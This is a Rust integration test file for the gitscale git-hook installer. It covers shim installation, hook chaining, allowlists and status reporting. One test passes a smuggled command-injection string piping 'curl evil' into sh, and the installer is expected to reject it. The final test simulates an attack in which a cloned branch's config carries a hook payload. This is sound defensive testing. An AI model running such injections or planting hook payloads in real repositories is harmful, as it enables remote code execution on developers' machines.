// Each integration test binary compiles `helpers` separately; this one uses
// only part of it.
#[allow(dead_code)]
mod helpers;

use helpers::TestEnv;
use std::path::{Path, PathBuf};
use std::process::Command;

use gitscale::trust::ALLOW_ENV;

// ---------------------------------------------------------------------------
// `gitscale hook` — install / uninstall / shim behaviour
//
// `--local` is exercised in-process. `--global` writes to the user's git
// config, so those tests run the binary as a subprocess under an isolated HOME
// and never touch the developer's own.
// ---------------------------------------------------------------------------

/// Run the CLI directly: `TestEnv::run` injects `-C` after the first
/// subcommand, which lands in the wrong place for a nested one like `hook`.
fn cli(args: &[&str]) -> helpers::CliOutput {
    let mut full = vec!["gitscale"];
    full.extend_from_slice(args);
    gitscale::run_cli(&full)
}

/// A git repo with an initial commit, optionally carrying a gitscale config.
fn repo_with(env: &TestEnv, config: Option<&str>) -> PathBuf {
    let repo = env.playground.clone();
    helpers::run_git_pub(&repo, &["init", "-q", "-b", "main"]);
    helpers::run_git_pub(&repo, &["config", "user.email", "t@t.com"]);
    helpers::run_git_pub(&repo, &["config", "user.name", "T"]);
    if let Some(text) = config {
        std::fs::write(repo.join(".gitscale.toml"), text).unwrap();
    }
    std::fs::write(repo.join("f.txt"), "v1").unwrap();
    helpers::run_git_pub(&repo, &["add", "-A"]);
    helpers::run_git_pub(&repo, &["commit", "-q", "-m", "init"]);
    repo
}

fn hooks_dir(repo: &Path) -> PathBuf {
    repo.join(".git/hooks")
}

fn is_executable(path: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path)
            .map(|m| m.permissions().mode() & 0o111 != 0)
            .unwrap_or(false)
    }
    #[cfg(not(unix))]
    {
        path.exists()
    }
}

/// Execute an installed hook script the way git would.
fn run_hook(script: &Path, cwd: &Path, sentinel: Option<&str>) -> (i32, String) {
    let mut cmd = Command::new("sh");
    cmd.arg(script).current_dir(cwd);
    match sentinel {
        Some(v) => cmd.env("GITSCALE_HOOK", v),
        None => cmd.env_remove("GITSCALE_HOOK"),
    };
    let out = cmd.output().expect("failed to run hook");
    let mut text = String::from_utf8_lossy(&out.stdout).into_owned();
    text.push_str(&String::from_utf8_lossy(&out.stderr));
    (out.status.code().unwrap_or(-1), text)
}

#[test]
fn install_local_writes_both_hooks() {
    let env = TestEnv::new("hook_install_local");
    let repo = repo_with(&env, Some("[repos]\n"));

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        let path = hooks_dir(&repo).join(hook);
        assert!(path.is_file(), "{} was not installed", hook);
        assert!(is_executable(&path), "{} is not executable", hook);
        let body = std::fs::read_to_string(&path).unwrap();
        assert!(
            body.contains("installed by gitscale"),
            "{} lacks the gitscale marker",
            hook
        );
    }
}

/// git runs every worktree's hooks from the common `.git/hooks`; a linked
/// worktree's own git dir (`.git/worktrees/<name>`) is never consulted.
#[test]
fn install_local_from_a_linked_worktree_writes_the_shared_hooks() {
    let env = TestEnv::new("hook_install_worktree");
    let repo = repo_with(&env, Some("[repos]\n"));
    let wt = env.repos_remote.join("wt");
    helpers::run_git_pub(&repo, &["worktree", "add", "-q", wt.to_str().unwrap()]);

    let out = cli(&["hook", "install", "--local", "-C", wt.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        assert!(
            hooks_dir(&repo).join(hook).is_file(),
            "{} not in the shared hooks dir",
            hook
        );
        assert!(
            !repo.join(".git/worktrees/wt/hooks").join(hook).exists(),
            "{} written to the worktree's private git dir",
            hook
        );
    }

    let out = cli_isolated(
        &isolated_home(&env),
        &["hook", "status", "-C", wt.to_str().unwrap()],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains(&*hooks_dir(&repo).canonicalize().unwrap().to_string_lossy()),
        "status should report the shared hooks dir:\n{}",
        out.stdout
    );
}

#[test]
fn install_displaces_and_chains_an_existing_hook() {
    let env = TestEnv::new("hook_install_chains");
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho MINE\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&own, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(out.success, "stderr: {}", out.stderr);

    let displaced = hooks_dir(&repo).join("post-checkout.local");
    assert!(
        displaced.is_file(),
        "the repo's own hook should have been moved aside, not destroyed"
    );
    assert_eq!(
        std::fs::read_to_string(&displaced).unwrap(),
        "#!/bin/sh\necho MINE\n"
    );

    let shim = std::fs::read_to_string(hooks_dir(&repo).join("post-checkout")).unwrap();
    assert!(
        shim.contains(displaced.to_str().unwrap()),
        "the shim should chain to the displaced hook"
    );
}

#[test]
fn uninstall_restores_the_displaced_hook() {
    let env = TestEnv::new("hook_uninstall_restores");
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho MINE\n").unwrap();

    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    assert!(cli(&["hook", "uninstall", "--local", "-C", root]).success);

    assert_eq!(
        std::fs::read_to_string(&own).unwrap(),
        "#!/bin/sh\necho MINE\n",
        "the repo's own hook should be back where git expects it"
    );
    assert!(
        !hooks_dir(&repo).join("post-checkout.local").exists(),
        "the displaced copy should be gone"
    );
    assert!(!hooks_dir(&repo).join("post-merge").exists());
}

#[test]
fn shim_is_silent_in_a_repo_without_a_gitscale_config() {
    let env = TestEnv::new("hook_shim_silent");
    let repo = repo_with(&env, None); // no .gitscale.toml
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, None);
    assert_eq!(code, 0, "must not disturb repos that never opted in");
    assert!(
        output.trim().is_empty(),
        "expected no output in a non-gitscale repo, got: {}",
        output
    );
}

#[test]
fn shim_runs_the_chained_hook_and_honours_the_recursion_guard() {
    let env = TestEnv::new("hook_shim_chain");
    // A config is present, so without the guard the shim would invoke gitscale.
    let repo = repo_with(&env, Some("[repos]\n"));
    let own = hooks_dir(&repo).join("post-checkout");
    std::fs::write(&own, "#!/bin/sh\necho CHAINED\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&own, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);

    // GITSCALE_HOOK set == this git call came from gitscale itself.
    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0);
    assert!(
        output.contains("CHAINED"),
        "the repo's own hook must still run: {}",
        output
    );
    assert!(
        !output.contains("Pulling"),
        "the recursion guard should have stopped gitscale from running: {}",
        output
    );
}

/// `git checkout -- <path>` fires post-checkout too, with a third argument of
/// 0. It moves no revision, and a build restoring a file must not have its
/// sub-repositories reset and cleaned underneath it.
#[test]
fn shim_ignores_a_file_checkout() {
    let env = TestEnv::new("hook_shim_file_checkout");
    let repo = repo_with(&env, Some("[repos]\n"));
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
    let script = hooks_dir(&repo).join("post-checkout");

    let run = |flag: &str| {
        let out = Command::new("sh")
            .arg(&script)
            .args(["0000000", "0000000", flag])
            .current_dir(&repo)
            .env_remove("GITSCALE_HOOK")
            .output()
            .expect("failed to run hook");
        format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        )
    };

    // An in-process install bakes in the test binary rather than gitscale, so
    // what the shim reaches cannot run a real pull here. Whether it reaches it
    // at all is the question: silence means the shim stopped first.
    let file_checkout = run("0");
    assert!(
        file_checkout.trim().is_empty(),
        "a file checkout must not reach gitscale: {}",
        file_checkout
    );
    assert!(
        !run("1").trim().is_empty(),
        "a branch checkout must still reach gitscale"
    );
}

#[test]
fn hook_run_rejects_an_unknown_hook_name() {
    let env = TestEnv::new("hook_run_unknown");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&["hook", "run", "pre-rebase", "-C", repo.to_str().unwrap()]);
    assert!(
        !out.success,
        "expected failure for a hook gitscale never installs"
    );
    assert!(
        out.stderr.contains("unknown hook"),
        "stderr: {}",
        out.stderr
    );
}

#[test]
fn hook_status_reports_installed_hooks() {
    let env = TestEnv::new("hook_status");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);

    // Isolated: status reports the hooks directory git would really use, which
    // means consulting a global core.hooksPath — the developer may have one.
    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(out.stdout.contains("post-checkout"), "{}", out.stdout);
    assert!(out.stdout.contains("gitscale"), "{}", out.stdout);
}

// ---------------------------------------------------------------------------
// The allowlist the shim carries
// ---------------------------------------------------------------------------

/// The `ALLOW='...'` line the install baked into a shim.
fn baked_allowlist(script: &Path) -> String {
    let body = std::fs::read_to_string(script).unwrap();
    body.lines()
        .find(|l| l.starts_with("ALLOW='"))
        .unwrap_or_else(|| panic!("no ALLOW line in {}", script.display()))
        .trim_start_matches("ALLOW='")
        .trim_end_matches('\'')
        .to_string()
}

/// A throwaway HOME, so a test never reads or writes the developer's own git
/// config.
fn isolated_home(env: &TestEnv) -> PathBuf {
    let home = env.playground.join("home");
    std::fs::create_dir_all(&home).unwrap();
    home
}

/// Run the real binary with its own HOME, so a `--global` install writes to a
/// throwaway git config instead of the developer's.
fn cli_isolated(home: &Path, args: &[&str]) -> helpers::CliOutput {
    let out = Command::new(env!("CARGO_BIN_EXE_gitscale"))
        .args(args)
        .env("HOME", home)
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env_remove(ALLOW_ENV)
        .output()
        .expect("failed to run the gitscale binary");
    helpers::CliOutput {
        stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
        success: out.status.success(),
    }
}

#[test]
fn install_bakes_the_requested_allowlist_into_the_shim() {
    let env = TestEnv::new("hook_allow_baked");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--allow",
        "github.com/acme/*,git.internal.example/*",
        "-C",
        root,
    ]);
    assert!(out.success, "stderr: {}", out.stderr);

    for hook in ["post-checkout", "post-merge"] {
        assert_eq!(
            baked_allowlist(&hooks_dir(&repo).join(hook)),
            "github.com/acme/*,git.internal.example/*"
        );
    }
}

/// A `--local` install is already a decision about one repository, and the file
/// it writes cannot travel to anyone else — so it needs no patterns.
#[test]
fn install_local_allows_its_own_repository_by_default() {
    let env = TestEnv::new("hook_allow_local_default");
    let repo = repo_with(&env, Some("[repos]\n"));
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "*"
    );
}

/// Upgrading gitscale means re-running install; that must not silently widen or
/// narrow what the machine already allows.
#[test]
fn reinstall_keeps_the_existing_allowlist() {
    let env = TestEnv::new("hook_allow_reinstall");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "github.com/acme/*",
            "-C",
            root
        ])
        .success
    );
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "github.com/acme/*"
    );

    // ...and passing --allow again replaces it.
    assert!(cli(&["hook", "install", "--local", "--allow", "*", "-C", root]).success);
    assert_eq!(
        baked_allowlist(&hooks_dir(&repo).join("post-checkout")),
        "*"
    );
}

/// A global install arms every clone on the machine, so it has to be told what
/// it may run. Guessing a default here is the bug this exists to prevent.
#[test]
fn install_global_requires_an_allowlist() {
    let env = TestEnv::new("hook_allow_global_required");
    let home = isolated_home(&env);

    let out = cli_isolated(&home, &["hook", "install", "--global"]);
    assert!(!out.success, "stdout: {}", out.stdout);
    assert!(
        out.stderr.contains("--allow is required"),
        "stderr: {}",
        out.stderr
    );
    assert!(
        !home.join(".config/gitscale/hooks").exists(),
        "a refused install must not leave hooks behind"
    );

    let out = cli_isolated(
        &home,
        &[
            "hook",
            "install",
            "--global",
            "--allow",
            "github.com/acme/*",
        ],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert_eq!(
        baked_allowlist(&home.join(".config/gitscale/hooks/post-checkout")),
        "github.com/acme/*"
    );
}

#[test]
fn install_refuses_a_pattern_that_would_break_the_shim() {
    let env = TestEnv::new("hook_allow_quote");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--allow",
        "a'; curl evil | sh; echo '",
        "-C",
        repo.to_str().unwrap(),
    ]);
    assert!(!out.success);
    assert!(
        out.stderr.contains("cannot be written into a hook script"),
        "stderr: {}",
        out.stderr
    );
}

/// A shim written before the allowlist existed passes no patterns. Running wide
/// open in that case would leave the hole in place across an upgrade.
#[test]
fn hook_run_refuses_when_the_shim_passed_no_allowlist() {
    let env = TestEnv::new("hook_run_no_allowlist");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&["hook", "run", "post-checkout", "-C", repo.to_str().unwrap()]);
    assert!(!out.success);
    assert!(
        out.stderr.contains("installed by an older gitscale"),
        "stderr: {}",
        out.stderr
    );
}

#[test]
fn hook_status_reports_the_allowlist() {
    let env = TestEnv::new("hook_status_allowlist");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "github.com/acme/*",
            "-C",
            root
        ])
        .success
    );

    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(out.stdout.contains("hook allowlist"), "{}", out.stdout);
    assert!(out.stdout.contains("github.com/acme/*"), "{}", out.stdout);
    assert!(out.stdout.contains("NOT allowed"), "{}", out.stdout);
}

/// A monorepo that commits its own copies of the shim — `.githooks/`, pointed
/// at by a repo-local `core.hooksPath` — is running gitscale, and status must
/// say so rather than call them foreign and advise installing over them.
/// Uninstall, which acts only on shims gitscale wrote, leaves them alone.
#[test]
fn hook_status_recognises_a_repositorys_own_copy_of_the_shim() {
    let env = TestEnv::new("hook_status_vendored");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();

    // Generate a real shim, then commit a copy the way the monorepo does: its
    // own header, no gitscale marker.
    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "gitlab.example/*",
            "-C",
            root
        ])
        .success
    );
    let vendored = repo.join(".githooks");
    std::fs::create_dir_all(&vendored).unwrap();
    for hook in ["post-checkout", "post-merge"] {
        let shim = std::fs::read_to_string(hooks_dir(&repo).join(hook)).unwrap();
        let copy: String = shim
            .lines()
            .map(|l| {
                if l.starts_with("# installed by gitscale") {
                    "# Delegate to the gitscale installed by the current environment."
                } else {
                    l
                }
            })
            .collect::<Vec<_>>()
            .join("\n");
        std::fs::write(vendored.join(hook), copy).unwrap();
    }
    helpers::run_git_pub(&repo, &["config", "core.hooksPath", ".githooks"]);

    // A global install is what the repo-local path shadows.
    let home = isolated_home(&env);
    std::fs::write(
        home.join(".gitconfig"),
        "[core]\n\thooksPath = /etc/gitscale/hooks\n",
    )
    .unwrap();

    let out = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("gitscale (repository's own copy)"),
        "{}",
        out.stdout
    );
    assert!(
        !out.stdout.contains("other (not gitscale)"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("run gitscale, so nothing is lost"),
        "{}",
        out.stdout
    );
    assert!(
        !out.stdout.contains("hook install --local"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("gitlab.example/*"),
        "its allowlist: {}",
        out.stdout
    );

    // Committed files are the repository's, not gitscale's to remove.
    assert!(cli_isolated(&home, &["hook", "uninstall", "--local", "-C", root]).success);
    assert!(vendored.join("post-checkout").exists());
    assert!(vendored.join("post-merge").exists());
}

/// Without copies of its own in the repo's hooks directory, the advice stands.
#[test]
fn hook_status_still_flags_a_repo_path_that_runs_no_gitscale() {
    let env = TestEnv::new("hook_status_shadowed");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    let own = repo.join(".githooks");
    std::fs::create_dir_all(&own).unwrap();
    std::fs::write(own.join("post-checkout"), "#!/bin/sh\necho lint\n").unwrap();
    helpers::run_git_pub(&repo, &["config", "core.hooksPath", ".githooks"]);
    let home = isolated_home(&env);
    std::fs::write(
        home.join(".gitconfig"),
        "[core]\n\thooksPath = /etc/gitscale/hooks\n",
    )
    .unwrap();

    let out = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("other (not gitscale)"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("hook install --local"),
        "{}",
        out.stdout
    );
}

/// The reported attack, end to end: a global hook is installed, an attacker's
/// branch carries a `.gitscale.toml` with a payload, and a developer clones it
/// to review. Nothing but the allowlist stands in the way.
#[test]
fn a_global_hook_refuses_a_payload_from_a_cloned_branch() {
    let env = TestEnv::new("hook_clone_attack");
    let home = isolated_home(&env);
    let loot = home.join("STOLEN");

    // The attacker's branch, pushed to a repository the developer will clone.
    let upstream = env.create_bare_repo(
        "payload",
        "main",
        &[(
            ".gitscale.toml",
            &format!("[hooks]\npost_sync = \"touch {}\"\n", loot.display()),
        )],
    );

    let out = cli_isolated(
        &home,
        &[
            "hook",
            "install",
            "--global",
            "--allow",
            "github.com/acme/*",
        ],
    );
    assert!(out.success, "stderr: {}", out.stderr);

    // The developer clones the branch to take a look.
    let victim = env.playground.join("victim");
    let clone = Command::new("git")
        .args([
            "clone",
            "--branch",
            "main",
            upstream.to_str().unwrap(),
            victim.to_str().unwrap(),
        ])
        .env("HOME", &home)
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env_remove(ALLOW_ENV)
        .output()
        .expect("failed to clone");
    let report = String::from_utf8_lossy(&clone.stderr).into_owned();

    assert!(
        !loot.exists(),
        "the payload ran during a plain `git clone`:\n{}",
        report
    );
    assert!(
        report.contains("refusing to run the post_sync hook"),
        "the refusal must be visible to whoever cloned it:\n{}",
        report
    );

    // And the other half: with the workspace inside the allowlist, the same
    // shim runs the same hook. The patterns are the only thing deciding.
    let allow = format!("{}/*", env.playground.display());
    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", &allow]).success);
    let checkout = Command::new("git")
        .args(["checkout", "-B", "review", "main"])
        .current_dir(&victim)
        .env("HOME", &home)
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env_remove(ALLOW_ENV)
        .output()
        .expect("failed to checkout");
    assert!(
        loot.exists(),
        "an allowlisted workspace should still run its hook:\n{}",
        String::from_utf8_lossy(&checkout.stderr)
    );
}
